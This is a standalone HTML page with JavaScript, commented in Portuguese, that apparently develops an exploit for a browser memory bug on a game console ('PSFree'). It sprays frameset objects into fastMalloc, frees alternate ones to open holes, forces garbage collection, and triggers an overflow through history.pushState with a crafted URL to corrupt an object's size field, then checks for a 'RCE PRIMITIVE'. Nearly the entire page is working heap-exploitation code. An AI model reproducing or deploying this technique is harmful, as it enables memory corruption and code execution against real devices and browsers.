<!DOCTYPE html>
<html>
<head>
    <title>PSFree Logic: Frameset Class Finder</title>
    <style>
        body { background-color: #000; color: #0f0; font-family: monospace; padding: 20px; }
        button { 
            font-size: 24px; padding: 20px; width: 100%; border: 2px solid #0f0; background: #111; color: #fff; cursor: pointer; margin-bottom: 15px;
        }
        #log { border: 1px solid #333; height: 400px; overflow-y: scroll; padding: 10px; color: cyan; font-size: 14px; }
        .win { background-color: #00ff00; color: #000; font-weight: bold; font-size: 1.6em; padding: 10px; border: 4px solid white; }
    </style>
</head>
<body>

    <h1>Frameset Class Finder</h1>
    <p>Usando a vítima do PSFree em tamanhos maiores (fastMalloc).</p>

    <button onclick="runTest(16384)">TESTAR 16 KB</button>
    <button onclick="runTest(32768)">TESTAR 32 KB</button>
    <button onclick="runTest(65536)">TESTAR 64 KB</button>
    <button onclick="runTest(131072)">TESTAR 128 KB</button>
    
    <div id="log">Pronto. Reinicie o console.</div>

    <script>
        const BASE_OFFSET = 709520; 
        const OVERFLOW_AMT = 1024 * 32; // 32KB de overflow é suficiente

        var victims = [];

        function log(msg, type) {
            const el = document.getElementById('log');
            let cls = type === 'win' ? 'class="win"' : '';
            el.innerHTML += `<div ${cls}>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
            el.scrollTop = el.scrollHeight;
        }

        async function runTest(targetBytes) {
            log(`----------------------------------------`);
            log(`INICIANDO TESTE: FRAMESET ${targetBytes / 1024} KB`);

            // 1. CÁLCULO REVERSO DO PSFREE
            // Queremos que o objeto final na memória tenha 'targetBytes'.
            // UniqueArray tem 8 bytes de header.
            const dataBytes = targetBytes - 8;
            const elements = dataBytes / 8;
            const commas = elements - 1;
            
            const rowsString = ",".repeat(commas);

            log(`Gerando string com ${commas} vírgulas...`);

            // 2. SPRAY
            victims = [];
            // Spray denso para encher o fastMalloc
            const SPRAY_COUNT = 400; 

            try {
                for(let i=0; i<SPRAY_COUNT; i++) {
                    let fset = document.createElement('frameset');
                    fset.rows = rowsString;
                    victims.push(fset);
                }

                // 3. BURACOS
                log("Abrindo buracos no fastMalloc...");
                for(let i=0; i<SPRAY_COUNT; i+=2) {
                    victims[i].rows = ""; 
                    victims[i] = null;
                }

                await forceGC();

                // 4. EXPLOIT
                log("Disparando Overflow...");
                setTimeout(() => {
                    try {
                        let buffer = "A".repeat(BASE_OFFSET);
                        // Escrevemos 0x01. No frameset, isso vai sobrescrever o '_size'.
                        // _size = 0x01010101... (Gigante)
                        buffer += "\x01".repeat(OVERFLOW_AMT);
                        
                        history.pushState({}, "frameset_opt", "/" + buffer);

                        log("Verificando Framesets (OOM Detector)...");
                        checkVictims();

                    } catch (e) {
                        log("Erro JS: " + e.message);
                    }
                }, 500);

            } catch(e) {
                log("Erro de Alocação: " + e.message);
            }
        }

        function checkVictims() {
            let found = false;
            for(let i=1; i<victims.length; i+=2) {
                let fset = victims[i];
                if(!fset) continue;

                try {
                    // SE o tamanho foi corrompido para algo gigante,
                    // acessar .rows vai tentar gerar uma string gigante.
                    // Isso vai demorar muito ou dar erro de memória.
                    
                    let s = fset.rows;

                    // Se leu rápido e o tamanho é normal, falhou.
                    if (s.length > 0 && s.length < 10000000) {
                        continue;
                    }

                    // Se o tamanho ficou absurdo (maior que o original)
                    log(`!!! ANOMALIA !!! Frameset ${i} retornou string enorme!`, 'win');
                    alert("RCE PRIMITIVE: FRAMESET!");
                    found = true;
                    break;

                } catch(e) {
                    // SE DER ERRO AO LER, É VITÓRIA!
                    // Significa que o tamanho era tão grande que o JS não conseguiu montar a string.
                    log(`!!! JACKPOT !!! Erro ao ler Frameset ${i}: ${e.message}`, 'win');
                    alert("RCE PRIMITIVE: FRAMESET CORRUPTED!");
                    found = true;
                    break;
                }
            }
            if(!found) log("Nenhum frameset afetado.");
        }

        async function forceGC() {
            try { new ArrayBuffer(50 * 1024 * 1024); } catch(e){}
            return new Promise(r => setTimeout(r, 600));
        }
    </script>
</body>
</html>
